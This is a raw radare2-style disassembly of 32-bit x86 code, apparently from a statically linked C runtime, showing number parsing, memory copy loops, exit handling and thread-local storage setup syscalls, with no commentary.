mov dword [var_9ch_2], edx
je 0x806f8c6
mov ecx, dword [var_90h_2]
movzx eax, byte [ecx]
inc ecx
mov dword [var_90h_2], ecx
cmp edx, eax
jne 0x807440f
dec ebx
test ebx, ebx
jg 0x80743a5
jmp 0x806f69c
movzx eax, dl
mov edx, dword [var_4h]
mov dword [var_4h], eax
mov dword [esp], edx
jmp 0x806f8b2
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x80743dc
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x80743cd
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov edx, 0xffffffff
jmp 0x80743e2
mov eax, dword [var_90h]
movzx ebx, byte [eax]
jmp 0x806f66c
mov dword [esp], eax
call fcn.08074540
jmp 0x806f648
mov ecx, dword [arg_8h]
lea eax, [var_1ch]
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
mov dword [var_8h], ecx
call section.
jmp 0x806f63b
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x806f74c
call fcn.08048b20
mov dword [eax], 9
jmp 0x8074499
mov edx, dword [0x80a9ab4]
mov dword [var_ach], edx
jmp 0x806f55c
mov dword [var_sp_ch], str._IO_vfscanf
mov dword [var_8h], 0x7fe
mov dword [var_4h], str.vfscanf.c
mov dword [esp], str.cnt______uint32_t_______locale_t_____pthread_internal_tsd_get_____void__0______pthread_internal_tsd_get___LIBC_TSD_KEY_LOCALE__:___libc_tsd_LOCALE_data______locales___LC_CTYPE____values___int____NL_CTYPE_MB_CUR_MAX___0xffff__.word__
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [var_sp_ch]
mov dword [esp + 0xc], 0
mov dword [var_8h_4], eax
mov eax, dword [var_8h]
mov dword [var_4h_4], eax
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.0806f500
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
call fcn.08048b20
mov esi, dword [arg_8h]
mov ebx, dword [eax]
mov eax, dword [0x80a9504]
mov ecx, dword [eax + 0x5c]
test ecx, ecx
je 0x8049d25
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049c40
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [esp], eax
call fcn.0804b3c0
cmp eax, 0xffffffff
je 0x8049d05
mov dword [esp], eax
call fcn.080542c0
cmp eax, 0xffffffff
mov edi, eax
je 0x8049d05
mov dword [var_sp_4h], 0x8092926
mov dword [esp], eax
call fcn.08049f40
test eax, eax
mov dword [var_10h], eax
je 0x8049d80
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08049c40
mov eax, dword [var_10h]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov dword [arg_8h], eax
leave
jmp fcn.08049dc0
mov dword [esp], edi
call fcn.08053f20
jmp 0x8049d05
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x10
mov edx, dword [0x80a9054]
mov esi, dword [arg_8h]
test edx, edx
je 0x804937a
mov eax, dword [edx + 4]
test eax, eax
je 0x804935a
lea esi, [esi]
dec eax
mov dword [edx + 4], eax
shl eax, 4
lea eax, [eax + edx]
lea ecx, [eax + 8]
mov eax, dword [eax + 8]
cmp eax, 4
ja case.0x8049335.0
jmp dword [eax*4 + 0x8092834]
lea esi, [esi]
mov eax, dword [ecx + 8]
mov dword [esp], esi
mov dword [var_4h], eax
call dword [ecx + 4]
mov edx, dword [0x80a9054]
mov eax, dword [edx + 4]
test eax, eax
jne 0x8049320
mov eax, edx
mov edx, dword [edx]
test edx, edx
mov dword [0x80a9054], edx
je 0x804937a
mov dword [esp], eax
call fcn.08051180
mov edx, dword [0x80a9054]
test edx, edx
jne 0x8049315
mov ebx, section.__libc_atexit
cmp ebx, section.__libc_subfreeres
jb 0x804938f
mov dword [esp], esi
call fcn.08053d90
call dword [ebx]
add ebx, 4
cmp ebx, section.__libc_subfreeres
jb 0x804938f
jmp 0x8049387
call dword [ecx + 4]
jmp 0x804934d
mov dword [var_4h], esi
mov eax, dword [ecx + 8]
mov dword [esp], eax
jmp 0x804934a
mov ebx, dword [arg_4h]
mov eax, 0xfc
int 0x80
mov eax, 1
int 0x80
hlt
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_8h]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.080494c0
leave
ret
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8049501
mov dword [esp], 3
call section.
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08049580
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x80494db
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x40
mov dword [var_2ch], 0
mov dword [var_28h], 0
mov edx, dword [arg_18h]
mov esi, dword [arg_10h]
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
test edx, edx
jne 0x8049918
mov dword [var_30h], 0
test esi, esi
js 0x80495c0
cmp esi, 1
je 0x80495c0
cmp esi, 0x24
jle 0x80495d5
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
add esp, 0x40
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [arg_8h]
mov edi, dword [arg_18h]
mov dword [var_1ch], ebx
mov edi, dword [edi + 0x34]
movsx eax, byte [ebx]
mov dword [var_3ch], edi
test byte [edi + eax*2 + 1], 0x20
je 0x804990d
inc ebx
mov ecx, dword [var_3ch]
movzx edx, byte [ebx]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x80495f2
test dl, dl
je 0x8049734
cmp dl, 0x2d
mov dword [var_10h], 0
je 0x8049904
cmp dl, 0x2b
je 0x80498fb
cmp dl, 0x30
je 0x80498c3
test esi, esi
mov eax, 0xa
cmove esi, eax
cmp esi, 0xa
mov eax, 0
mov dword [var_1ch], ebx
cmove eax, dword [var_30h]
mov dword [var_20h], 0
test eax, eax
mov dword [var_30h], eax
jne 0x804980f
movzx eax, byte [esi + 0x80928fe]
mov edi, dword [esi*4 + 0x8092858]
mov dword [var_24h], 0
mov dword [var_3ch], 0
mov dword [var_14h], edi
mov dword [var_18h], eax
movzx ecx, byte [ebx]
test cl, cl
je 0x80496c2
cmp ebx, dword [var_20h]
je 0x80496c2
lea eax, [ecx - 0x30]
cmp al, 9
ja 0x804979c
mov ecx, eax
movzx eax, cl
cmp eax, esi
jge 0x80496c2
mov edx, dword [var_14h]
cmp dword [var_3ch], edx
ja 0x8049790
je 0x8049780
mov edi, dword [var_3ch]
movzx eax, cl
imul edi, esi
add edi, eax
mov dword [var_3ch], edi
inc ebx
movzx ecx, byte [ebx]
test cl, cl
jne 0x8049681
cmp ebx, dword [var_1ch]
je 0x8049734
mov eax, dword [arg_ch]
test eax, eax
je 0x80496d3
mov eax, dword [arg_ch]
mov dword [eax], ebx
mov edi, dword [var_24h]
test edi, edi
jne 0x8049704
mov esi, dword [var_10h]
test esi, esi
je 0x804972b
cmp dword [var_3ch], 0x80000000
ja 0x8049722
mov ecx, dword [var_24h]
test ecx, ecx
jne 0x8049704
mov eax, dword [var_3ch]
mov edx, dword [var_10h]
neg eax
test edx, edx
cmove eax, dword [var_3ch]
jmp 0x80495cd
call fcn.08048b20
mov dword [eax], 0x22
xor eax, eax
cmp dword [var_10h], 0
setne al
add eax, 0x7fffffff
jmp 0x80495cd
mov dword [var_24h], 1
jmp 0x80496ea
mov ebx, dword [var_3ch]
test ebx, ebx
jns 0x80496ea
jmp 0x8049722
mov eax, dword [arg_ch]
test eax, eax
je 0x80495cb
mov eax, dword [var_1ch]
sub eax, dword [arg_8h]
dec eax
jle 0x804975b
mov ecx, dword [var_1ch]
mov edi, dword [arg_18h]
movsx edx, byte [ecx - 1]
mov eax, dword [edi + 0x3c]
cmp dword [eax + edx*4], 0x58
je 0x8049768
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x80495cb
cmp byte [ecx - 2], 0x30
jne 0x804975b
mov edx, dword [arg_ch]
mov eax, ecx
dec eax
mov dword [edx], eax
jmp 0x80495cb
nop
lea esi, [esi]
cmp eax, dword [var_18h]
jbe 0x80496ac
lea esi, [esi]
mov dword [var_24h], 1
jmp 0x80496ba
mov eax, dword [var_2ch]
test eax, eax
je 0x80497f6
xor edx, edx
cmp edx, dword [var_2ch]
jae 0x80497c2
lea esi, [esi]
mov edi, dword [var_28h]
movzx eax, byte [edx + ebx]
cmp byte [edx + edi], al
jne 0x80497c2
inc edx
cmp edx, dword [var_2ch]
jb 0x80497b0
cmp edx, dword [var_2ch]
je 0x80497ea
movzx edx, cl
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80496c2
mov eax, dword [ecx + 0x3c]
movzx ecx, byte [eax + edx*4]
sub ecx, 0x37
jmp 0x8049693
mov eax, dword [var_2ch]
lea ebx, [eax + ebx - 1]
jmp 0x80496ba
mov edi, dword [arg_18h]
movzx edx, cl
mov eax, dword [edi + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80496c2
mov eax, dword [edi + 0x3c]
jmp 0x80497de
mov edi, dword [var_28h]
mov dword [esp], edi
call fcn.08053400
xor edx, edx
mov dword [var_20h], ebx
mov dword [var_2ch], eax
mov dword [var_34h], eax
cmp edx, dword [var_2ch]
jae 0x804983c
mov ecx, dword [var_28h]
movzx eax, byte [edx + ebx]
cmp byte [edx + ecx], al
jne 0x804983c
inc edx
cmp edx, dword [var_34h]
jb 0x804982a
cmp edx, dword [var_34h]
jae 0x8049658
movzx ecx, byte [ebx]
test cl, cl
je 0x804989e
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x8049891
xor edx, edx
cmp edx, dword [var_34h]
jae 0x804986f
mov eax, dword [var_20h]
mov edi, dword [var_28h]
movzx eax, byte [edx + eax]
cmp byte [edx + edi], al
jne 0x804986f
inc edx
cmp edx, dword [var_34h]
jb 0x804985a
cmp edx, dword [var_34h]
jae 0x8049891
mov eax, dword [var_3ch]
movzx edx, cl
test byte [eax + edx*2 + 1], 4
je 0x804989e
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x3c]
mov eax, dword [eax + edx*4]
sub eax, 0x37
cmp eax, esi
jge 0x804989e
inc dword [var_20h]
mov edi, dword [var_20h]
movzx ecx, byte [edi]
test cl, cl
jne 0x804984c
mov eax, dword [var_30h]
mov edx, dword [var_28h]
mov dword [esp], ebx
mov ecx, dword [var_20h]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08049980
mov dword [var_20h], eax
jmp 0x8049658
test esi, esi
je 0x80498de
cmp esi, 0x10
je 0x80498de
test esi, esi
jne 0x8049637
mov esi, 8
jmp 0x8049637
mov ecx, dword [arg_18h]
movsx edx, byte [ebx + 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
jne 0x80498cc
add ebx, 2
mov esi, 0x10
jmp 0x8049637
inc ebx
movzx edx, byte [ebx]
jmp 0x8049624
mov dword [var_10h], 1
jmp 0x80498fb
mov edi, dword [arg_8h]
movzx edx, byte [edi]
jmp 0x8049603
mov ecx, dword [eax + 0x2c]
mov dword [var_30h], ecx
movzx edx, byte [ecx]
test dl, dl
jle 0x80495ab
cmp dl, 0x7f
je 0x80495ab
mov eax, dword [eax + 0x28]
mov dword [var_28h], eax
cmp byte [eax], 0
jne 0x80495b2
mov dword [var_28h], 0
jmp 0x80495ab
push ebp
mov ebp, esp
push edi
push esi
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_10h]
lea edx, [edi - 1]
cmp ebx, 3
jbe 0x805357f
mov esi, ebx
shr esi, 2
lea esi, [esi]
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
dec esi
jne 0x8053550
and ebx, 3
je 0x80535a0
movzx eax, byte [ecx]
inc edx
inc ecx
dec ebx
mov byte [edx], al
je 0x80535a0
test al, al
jne 0x8053584
inc edx
dec ebx
mov byte [edx], 0
jne 0x8053592
lea esi, [esi]
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
mov eax, edx
sub eax, edi
sub ebx, eax
dec ebx
je 0x80535a0
jmp 0x8053592
cld
push edi
mov edx, dword [arg_8h]
mov ecx, dword [arg_10h]
movzx eax, byte [arg_ch]
jecxz 0x805372d
mov edi, edx
and edx, 3
je 0x8053719
jnp 0x805370e
stosb byte es:[edi], al
dec ecx
je 0x805372d
stosb byte es:[edi], al
dec ecx
je 0x805372d
xor edx, 3
je 0x8053719
stosb byte es:[edi], al
dec ecx
mov edx, ecx
shr ecx, 2
and edx, 3
imul eax, eax, 0x1010101
rep stosd dword es:[edi], eax
mov ecx, edx
rep stosb byte es:[edi], al
mov eax, dword [arg_8h]
pop edi
ret
mov ecx, dword [arg_ch]
mov eax, edi
mov edi, dword [arg_4h]
mov edx, esi
mov esi, dword [arg_8h]
cld
shr ecx, 1
jae 0x8053786
movsb byte es:[edi], byte ptr [esi]
shr ecx, 1
jae 0x805378c
movsw word es:[edi], word ptr [esi]
rep movsd dword es:[edi], dword ptr [esi]
mov edi, eax
mov esi, edx
mov eax, dword [arg_4h]
ret
push ebp
mov edx, eax
xor ecx, ecx
mov ebp, esp
push esi
xor esi, esi
push ebx
mov eax, dword [eax]
xor ebx, ebx
test eax, eax
je 0x805603e
sub eax, 3
cmp eax, 0x1d
ja case.0x805601b.4
jmp dword [eax*4 + 0x8093254]
mov eax, dword [edx + 4]
mov dword [0x80aac74], eax
lea esi, [esi]
add edx, 8
mov eax, dword [edx]
test eax, eax
jne 0x8056013
cmp ecx, 0xf
je 0x8056042
pop ebx
pop esi
leave
ret
xor eax, eax
test ebx, ebx
jne 0x805604c
test esi, esi
je 0x8056051
mov eax, 1
mov dword [0x80a95f4], eax
mov dword [0x80aac78], 1
jmp 0x805603e
mov eax, dword [edx + 4]
mov dword [0x80aac3c], eax
jmp case.0x805601b.4
mov eax, dword [edx + 4]
mov dword [0x80aac5c], eax
jmp case.0x805601b.4
xor ebx, dword [edx + 4]
or ecx, 1
jmp case.0x805601b.4
xor ebx, dword [edx + 4]
or ecx, 2
jmp case.0x805601b.4
xor esi, dword [edx + 4]
or ecx, 4
jmp case.0x805601b.4
xor esi, dword [edx + 4]
or ecx, 8
jmp case.0x805601b.4
mov eax, dword [edx + 4]
mov dword [0x80aa848], eax
jmp case.0x805601b.4
mov eax, dword [edx + 4]
mov dword [0x80aac44], eax
jmp case.0x805601b.4
mov eax, dword [edx + 4]
mov ecx, 0xffffffff
mov dword [0x80aac78], 1
mov dword [0x80a95f4], eax
jmp case.0x805601b.4
mov eax, dword [edx + 4]
mov dword [0x80a95d0], eax
jmp case.0x805601b.4
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], 4
mov dword [esp], 0x14
call fcn.08048700
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x5c
mov eax, dword [0x80aac3c]
mov dword [var_34h], 0
mov ecx, dword [arg_ch]
mov dword [var_2ch], 0
mov dword [var_30h], 0
test eax, eax
mov dword [var_38h], ecx
je 0x8048757
mov edx, eax
mov eax, dword [0x80aac5c]
shl eax, 5
lea eax, [eax + edx]
cmp edx, eax
jae 0x8048750
cmp dword [edx], 7
je 0x8048996
add edx, 0x20
cmp edx, eax
jb 0x8048740
mov eax, dword [var_2ch_2]
test eax, eax
jne 0x8048761
cmp dword [arg_8h], 0x14
jbe 0x8048936
mov eax, dword [var_2ch]
xor edx, edx
add eax, dword [0x80a95a4]
lea eax, [ecx + eax - 1]
div ecx
imul ecx, eax
mov eax, ecx
mov dword [var_3ch], ecx
add eax, dword [arg_8h]
add eax, dword [var_38h]
mov dword [esp], eax
call fcn.08054640
mov ebx, dword [var_3ch]
mov edx, dword [var_38h]
mov dword [0x80a9c80], 1
lea esi, [edx + eax - 1]
mov eax, edx
mov edx, dword [var_2ch]
neg eax
and esi, eax
add ebx, esi
lea eax, [edi + edx - 1]
test edi, edi
cmove eax, edx
mov dword [var_4ch], ebx
mov ecx, eax
je 0x80487bd
xor edx, edx
div edi
mov ecx, eax
mov eax, ecx
mov ebx, dword [var_2ch]
imul eax, edi
test edi, edi
cmovne ecx, eax
mov eax, dword [var_4ch]
sub eax, ecx
test edi, edi
mov dword [0x80a9c88], eax
lea eax, [edi + ebx - 1]
cmove eax, ebx
mov ecx, eax
je 0x80487e7
xor edx, edx
div edi
mov ecx, eax
mov eax, ecx
mov edx, dword [var_34h]
imul eax, edi
test edi, edi
mov dword [var_4h], edx
cmovne ecx, eax
mov eax, dword [var_30h]
mov dword [0x80aa0e4], ecx
mov dword [var_8h], eax
mov eax, dword [0x80a9c88]
mov dword [esp], eax
call fcn.08053770
lea ecx, [var_28h]
mov eax, dword [var_4ch]
mov ebx, dword [var_3ch]
mov edx, dword [var_4ch]
mov dword [eax], eax
mov dword [eax + 8], eax
mov dword [ebx + esi + 4], 0x80a9c84
mov eax, dword [0x80a95d0]
mov dword [var_24h], edx
mov ebx, ecx
mov dword [edx + 0x10], eax
movzx eax, byte [var_1ch]
mov dword [var_20h], 0xfffff
mov dword [var_28h], 0xffffffff
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_1ch], al
mov eax, 0xf3
and dword [var_1ch], 0x7f
int 0x80
test eax, eax
jne 0x804893e
mov eax, dword [var_28h_2]
lea eax, [eax*8 + 3]
mov gs, eax
xor eax, eax
test eax, eax
jne 0x80489bb
mov eax, dword [var_2ch_2]
mov edx, dword [var_34h_2]
mov dword [0x80aa0dc], edi
mov ebx, dword [var_30h_2]
and byte [0x80aa034], 0xfc
mov dword [0x80aa0e8], 1
test edi, edi
mov dword [0x80a9ca0], 0x40
mov dword [0x80aabd8], 1
mov dword [0x80aa0d8], eax
mov dword [0x80aa0d0], edx
mov dword [0x80aabdc], 0x80a9ca0
mov edx, eax
mov dword [0x80aa0d4], ebx
mov dword [0x80a9cb4], 0x80a9ec0
lea eax, [edi + eax - 1]
cmove eax, edx
mov ecx, eax
je 0x80488ea
xor edx, edx
div edi
mov ecx, eax
mov eax, ecx
mov ebx, dword [var_4h]
mov edx, 0x20
imul eax, edi
test edi, edi
cmovne ecx, eax
mov dword [var_2ch_2], ecx
add dword [var_2ch_2], ebx
cmp dword [var_38h_2], 0x1f
cmova edx, dword [var_38h_2]
mov eax, dword [var_2ch_2]
add eax, dword [0x80a95a4]
mov dword [0x80aabd4], edx
add eax, 0x1f
and eax, 0xffffffe0
mov dword [0x80a95a4], eax
mov eax, dword [var_2ch_2]
mov dword [0x80aabd0], eax
mov eax, dword [0x80aabd8]
mov dword [0x80aabe8], eax
add esp, 0x5c
pop ebx
pop esi
pop edi
leave
ret
cmp dword [0x80aac6c], 0x20362
jbe 0x804898c
movzx eax, byte [var_1ch_2]
mov dword [var_28h_2], 0
mov ebx, 1
mov edx, 0x10
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_1ch_2], al
mov eax, 0x7b
and dword [var_1ch_2], 0x7f
int 0x80
test eax, eax
mov edx, str.cannot_set_up_LDT_for_thread_local_storage_n
jne 0x8048985
mov eax, 7
mov gs, eax
xor edx, edx
mov eax, edx
jmp 0x8048874
mov eax, str.kernel_too_old_for_thread_local_storage_support_n
jmp 0x8048874
mov eax, dword [edx + 0x14]
mov edi, dword [edx + 0x1c]
mov ebx, dword [edx + 0x10]
mov dword [var_2ch_2], eax
cmp edi, ecx
mov eax, dword [edx + 8]
mov dword [var_30h_2], ebx
mov dword [var_34h_2], eax
jbe 0x8048750
mov dword [var_38h_2], edi
jmp 0x8048750
mov dword [esp], eax
call fcn.0804b4c0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
call fcn.080493f0
mov edx, eax
mov eax, 0xffffffff
test edx, edx
je 0x80493ed
mov eax, dword [arg_8h]
mov dword [edx], 4
mov dword [edx + 4], eax
mov eax, dword [arg_ch]
mov dword [edx + 8], eax
mov eax, dword [arg_10h]
mov dword [edx + 0xc], eax
xor eax, eax
leave
ret
push ebp
mov eax, 0
mov ebp, esp
push esi
xor esi, esi
push ebx
sub esp, 4
test eax, eax
je 0x804940f
mov dword [esp], 0x80aa100
call section.
mov ebx, dword [0x80a9054]
test ebx, ebx
je 0x8049449
lea esi, [esi]
mov edx, dword [ebx + 4]
xor esi, esi
cmp esi, edx
jae 0x804943e
lea eax, [ebx + 8]
lea esi, [esi]
mov ecx, dword [eax]
test ecx, ecx
je 0x80494b5
inc esi
add eax, 0x10
cmp esi, edx
jb 0x8049430
cmp edx, 0x1f
jbe 0x80494a7
mov ebx, dword [ebx]
test ebx, ebx
jne 0x8049420
mov dword [esp], 0x208
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x804947e
mov eax, dword [0x80a9054]
mov dword [ebx + 4], 1
xor esi, esi
mov dword [ebx], eax
mov dword [0x80a9054], ebx
mov eax, esi
shl eax, 4
mov dword [ebx + eax + 8], 1
mov eax, 0
test eax, eax
je 0x8049493
mov dword [esp], 0x80aa100
call section.
xor eax, eax
test ebx, ebx
je 0x80494a0
shl esi, 4
lea eax, [esi + ebx + 8]
add esp, 4
pop ebx
pop esi
leave
ret
lea eax, [edx + 1]
mov esi, edx
mov dword [ebx + 4], eax
test ebx, ebx
jne 0x8049471
jmp 0x8049449
cmp esi, edx
jae 0x804943e
jmp 0x80494af
push ebp
mov ebp, esp
leave
jmp 0x8056400
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
call fcn.08062c50
nop
nop
nop
nop
nop
neg eax
push eax
call fcn.08048b20
pop ecx
mov dword [eax], ecx
mov eax, 0xffffffff
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, dword [0x80aac84]
mov ebp, esp
leave
ret
lea esi, [esi]
push ebp
mov eax, dword [0x80aaca0]
mov ebp, esp
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
mov eax, dword [arg_ch]
mov eax, dword [eax]
mov dword [arg_ch], eax
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [arg_8h], eax
leave
jmp fcn.08076e50
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov eax, dword [ebx]
mov dword [var_sp_4h], eax
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x8056578
mov eax, dword [ebx + 4]
mov dword [var_sp_4h], eax
mov eax, dword [esi + 4]
mov dword [esp], eax
call fcn.08076e50
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_14h], eax
mov dword [var_8h], fcn.08056540
mov dword [var_4h], 0x80aa85c
lea eax, [var_14h]
mov dword [var_bp_4h], ebx
mov dword [var_10h], edx
mov ebx, ecx
mov dword [var_ch], 0
mov dword [var_bp_8h], 0
mov dword [esp], eax
call fcn.0807a2c0
mov edx, 1
test eax, eax
je 0x80565d4
mov edx, dword [eax]
mov eax, dword [edx + 8]
mov edx, dword [edx + 0xc]
mov dword [ebx], eax
mov eax, dword [arg_8h]
mov dword [eax], edx
xor edx, edx
mov ebx, dword [var_bp_4h]
mov eax, edx
leave
ret 4
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov dword [var_18h], ecx
mov dword [var_14h], edx
mov dword [var_10h], eax
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08053400
lea edi, [eax + 1]
lea eax, [edi + esi + 0x10]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8056673
mov edx, dword [var_10h]
lea eax, [eax + 0x10]
mov dword [var_8h], esi
mov dword [ebx], eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov edx, dword [var_14h]
mov dword [var_8h], edi
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [esp], ebx
mov dword [ebx + 4], eax
mov dword [var_8h], fcn.08056540
mov dword [var_4h], 0x80aa85c
mov eax, dword [var_18h]
mov dword [ebx + 8], eax
mov eax, dword [arg_8h]
mov dword [ebx + 0xc], eax
call fcn.0807a190
test eax, eax
je 0x8056680
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret 4
lea esi, [esi]
mov dword [esp], ebx
call fcn.08051180
jmp 0x8056673
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, eax
mov eax, dword [eax + 8]
dec eax
test eax, eax
mov dword [ebx + 8], eax
jne 0x80566b3
mov eax, dword [ebx + 0x20]
test eax, eax
jne 0x80566c5
mov eax, dword [ebx]
test eax, eax
jne 0x80566b8
mov ebx, dword [var_4h]
leave
ret
call fcn.0805d3c0
mov dword [ebx], 0
jmp 0x80566b3
mov dword [esp], eax
call fcn.08083520
mov dword [esp], ebx
call dword [ebx + 0x20]
jmp 0x80566ad
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x14
mov eax, dword [eax + 0x14]
mov dword [var_1ch], 3
mov dword [var_10h], ecx
mov dword [var_14h], 0
test eax, eax
je 0x805670d
mov eax, dword [eax + 0x14]
inc dword [var_14h]
test eax, eax
jne 0x8056703
mov ebx, dword [var_14h]
mov eax, ebx
shl eax, 4
sub eax, ebx
shl eax, 2
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x80568bf
mov edx, dword [var_14h]
mov eax, dword [arg_ch]
mov dword [var_1ch], 0
mov dword [var_18h], edi
mov dword [eax], edx
dec edx
test ebx, ebx
mov dword [var_14h], edx
je 0x80567ce
mov eax, edx
shl eax, 4
sub eax, edx
lea ebx, [eax*4]
mov ecx, dword [var_14h]
test ecx, ecx
je 0x80568af
mov edx, dword [var_18h]
mov eax, dword [edx + 0x14]
mov eax, dword [eax]
mov dword [esi + ebx + 0xc], eax
mov edx, dword [arg_ch]
mov edi, ebx
mov eax, dword [var_14h]
inc eax
cmp eax, dword [edx]
je 0x805689d
mov eax, dword [esi + ebx + 0x48]
mov edx, dword [var_18h]
mov dword [esi + edi + 0x10], eax
mov dword [esi + ebx + 8], 1
mov dword [esi + ebx + 0x38], 0
mov eax, dword [edx + 0x10]
mov eax, dword [eax + 0x10]
cmp byte [eax], 0x2f
je 0x8056837
lea edx, [ebx + esi]
call fcn.08057dc0
mov eax, dword [var_18h]
sub ebx, 0x3c
mov eax, dword [eax + 0x14]
mov dword [var_18h], eax
mov eax, dword [var_14h]
dec dword [var_14h]
test eax, eax
jne 0x8056758
xor eax, eax
test eax, eax
jne 0x80567e0
mov edx, dword [arg_8h]
mov dword [edx], esi
mov eax, dword [var_1ch]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret 8
mov edx, dword [arg_ch]
inc dword [var_14h]
mov eax, dword [var_14h]
cmp eax, dword [edx]
jae 0x805680d
shl eax, 4
sub eax, dword [var_14h]
lea ebx, [esi + eax*4]
mov eax, ebx
add ebx, 0x3c
call fcn.08056690
mov edx, dword [arg_ch]
inc dword [var_14h]
mov eax, dword [var_14h]
cmp eax, dword [edx]
jb 0x80567f6
mov dword [esp], esi
call fcn.08051180
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [edx], 0
mov dword [eax], 0
mov edx, dword [var_1ch]
test edx, edx
jne 0x80567d3
mov dword [var_1ch], 1
jmp 0x80567d3
call fcn.0805d1a0
test eax, eax
mov edx, eax
je 0x80567e0
mov dword [esi + ebx], eax
mov ecx, dword [edx + 0x10]
mov dword [esi + ebx + 0x18], 0
mov eax, dword [eax]
test ecx, ecx
mov dword [esi + ebx + 0x1c], ecx
mov dword [esi + ebx + 4], eax
mov eax, dword [edx + 0xc]
mov dword [esi + ebx + 0x14], eax
mov eax, dword [edx + 0x14]
mov dword [esi + ebx + 0x20], eax
je 0x80567b2
mov dword [esp], ecx
call fcn.08083520
lea eax, [ebx + esi]
mov dword [esp], eax
call dword [esi + ebx + 0x1c]
test eax, eax
mov dword [var_1ch], eax
je 0x80567b2
dec dword [var_14h]
mov dword [esi + ebx - 0x1c], 0
jmp 0x80567e0
mov edx, dword [var_18h]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076e80
jmp 0x8056784
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08076e80
